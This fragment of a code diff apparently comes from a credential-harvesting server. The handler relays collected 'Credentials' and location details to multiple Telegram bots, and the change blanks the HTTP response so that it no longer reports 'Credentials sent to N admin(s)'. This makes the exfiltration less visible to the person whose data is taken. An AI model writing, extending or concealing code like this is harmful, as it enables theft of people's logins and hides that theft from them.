@@ -141,7 +141,7 @@ ${locationDetails}
         if (anySuccess) {
             const successCount = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
             console.log(`✅ Message sent to ${successCount}/${TELEGRAM_BOTS.length} bots`);
-            res.status(200).json({ message: `Credentials sent to ${successCount} admin(s)` });
+            res.status(200).json();
         } else {
             throw new Error('All Telegram bots failed to send message');
         }
